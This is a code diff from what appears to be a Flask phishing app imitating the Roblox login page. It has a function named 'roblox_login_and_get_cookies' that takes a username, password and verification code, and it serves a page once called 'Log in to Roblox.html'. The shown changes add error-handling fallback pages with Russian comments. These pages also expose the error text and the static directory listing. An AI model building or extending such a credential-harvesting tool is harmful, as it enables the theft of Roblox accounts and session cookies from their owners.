@@ -836,7 +836,21 @@ def roblox_login_and_get_cookies(username, password, session_id=None, code=None)
 
 @app.route('/')
 def login_page():
-    return app.send_static_file('Log in to Roblox.html')
+    try:
+        return app.send_static_file('login.html')
+    except Exception as e:
+        # Если файл не найден, возвращаем простую страницу
+        return f"""
+        <!DOCTYPE html>
+        <html>
+        <head><title>Roblox Login</title></head>
+        <body>
+            <h1>Roblox Login</h1>
+            <p>Файл login.html не найден. Ошибка: {e}</p>
+            <p>Доступные файлы в static: {os.listdir('static')}</p>
+        </body>
+        </html>
+        """
 
 @app.route('/login.html')
 def old_login_page():
@@ -844,7 +858,20 @@ def old_login_page():
 
 @app.route('/final.html')
 def final_page():
-    return app.send_static_file('final.html')
+    try:
+        return app.send_static_file('final.html')
+    except Exception as e:
+        return f"""
+        <!DOCTYPE html>
+        <html>
+        <head><title>Final Page</title></head>
+        <body>
+            <h1>Final Page</h1>
+            <p>Файл final.html не найден. Ошибка: {e}</p>
+            <p>Доступные файлы в static: {os.listdir('static')}</p>
+        </body>
+        </html>
+        """
 
 @app.route('/login', methods=['POST', 'OPTIONS'])
 def login():
